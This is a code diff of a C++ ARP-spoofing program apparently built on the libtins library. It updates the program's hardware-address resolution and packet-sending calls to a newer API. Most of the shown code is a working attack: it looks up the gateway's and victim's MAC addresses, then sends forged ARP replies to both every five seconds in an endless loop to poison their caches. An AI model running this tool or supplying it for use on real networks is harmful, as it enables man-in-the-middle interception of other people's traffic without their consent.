@@ -43,23 +43,18 @@ using namespace std;
 using namespace Tins;
 
 
-int do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim, 
+void do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim, 
   const NetworkInterface::Info &info) 
 {
     PacketSender sender;
     EthernetII::address_type gw_hw, victim_hw;
     
     // Resolves gateway's hardware address.
-    if(!Utils::resolve_hwaddr(iface, gw, &gw_hw, sender)) {
-        cout << "Could not resolve gateway's ip address.\n";
-        return 5;
-    }
+    gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
     
     // Resolves victim's hardware address.
-    if(!Utils::resolve_hwaddr(iface, victim, &victim_hw, sender)) {
-        cout << "Could not resolve victim's ip address.\n";
-        return 6;
-    }
+    victim_hw = Utils::resolve_hwaddr(iface, victim, sender);
+
     // Print out the hw addresses we're using.
     cout << " Using gateway hw address: " << gw_hw << "\n";
     cout << " Using victim hw address:  " << victim_hw << "\n";
@@ -77,12 +72,12 @@ int do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim,
      * We include our hw address as the source address
      * in ethernet layer, to avoid possible packet dropping
      * performed by any routers. */
-    EthernetII to_gw(iface, gw_hw, info.hw_addr, gw_arp);
-    EthernetII to_victim(iface, victim_hw, info.hw_addr, victim_arp);
+    EthernetII to_gw(gw_hw, info.hw_addr, gw_arp);
+    EthernetII to_victim(victim_hw, info.hw_addr, victim_arp);
     while(true) {
         // Just send them once every 5 seconds.
-        sender.send(to_gw);
-        sender.send(to_victim);
+        sender.send(to_gw, iface);
+        sender.send(to_victim, iface);
         sleep(5);
     }
 }
@@ -116,7 +111,7 @@ int main(int argc, char *argv[]) {
         return 3;
     }
     try {
-        return do_arp_spoofing(iface, gw, victim, info);
+        do_arp_spoofing(iface, gw, victim, info);
     }
     catch(std::runtime_error &ex) {
         std::cout << "Runtime error: " << ex.what() << std::endl;
